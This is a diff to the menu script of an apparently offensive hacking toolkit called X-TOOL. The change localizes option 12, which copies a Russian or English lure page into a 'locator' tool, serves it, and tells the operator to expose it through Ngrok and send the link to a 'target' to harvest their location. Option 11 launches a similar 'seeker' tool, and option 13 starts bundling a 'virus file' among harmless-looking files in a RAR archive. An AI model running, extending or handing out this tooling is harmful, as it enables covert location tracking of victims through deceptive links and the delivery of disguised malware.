@@ -136,11 +136,33 @@ if query in ["11"]:
 	print("Start Ngrok in another Terminal(ngrok http 8080)")
 	os.system("cd && cd X-TOOL && cd seeker && python3 seeker.py -t manual")
 if query in ["12"]:
-	print("Use 01")
-	print("Open Another Terminal and start Ngrok (ngrok http 55333)")
-	print("Send Link from Ngrok Terminal to target")
-	time.sleep(5)	
-	os.system("cd && cd X-TOOL && cd locator && bash locator.sh")
+	Lang = input("Enter What Language Will Used on Website!(ru/en):")
+	if Lang in ["ru"]:
+
+
+		print("Use 01")
+		print("Open Another Terminal and start Ngrok (ngrok http 55333)")
+		print("Send Link from Ngrok Terminal to target")
+		time.sleep(5)
+		os.system("cd && cd X-TOOL && cp index2_ru.html locator/")	
+		ChangeLangRu = ("cd && cd X-TOOL && cd locator && mv index2_ru.html index2.html && cp index2.html server/")
+		os.system(ChangeLangRu)
+		os.system("cd && cd X-TOOL && cd locator && bash locator.sh")
+	
+
+	if Lang in ["en"]:
+
+
+		print("Use 01")
+		print("Open Another Terminal and start Ngrok (ngrok http 55333)")
+		print("Send Link from Ngrok Terminal to target")
+		time.sleep(5)	
+		os.system("cd && cd X-TOOL && cp index2_en.html locator/")	
+		ChangeLangEn = ("cd && cd X-TOOL && cd locator && mv index2_en.html index2.html && cp index2.html server/")
+		os.system(ChangeLangEn)
+		os.system("cd && cd X-TOOL && cd locator && bash locator.sh")
+
+	
 if query in ["13"]:
 	Evil_file = input("Enter File name of virus file you want in rar archive(Put file in X-Tool folder (/home/X-TOOL)!:")
 	Good_files = input("Enter File Names of Good files (Example: world.txt hello.txt)(Put their in to X-Tool folder(/home/X-TOOL")
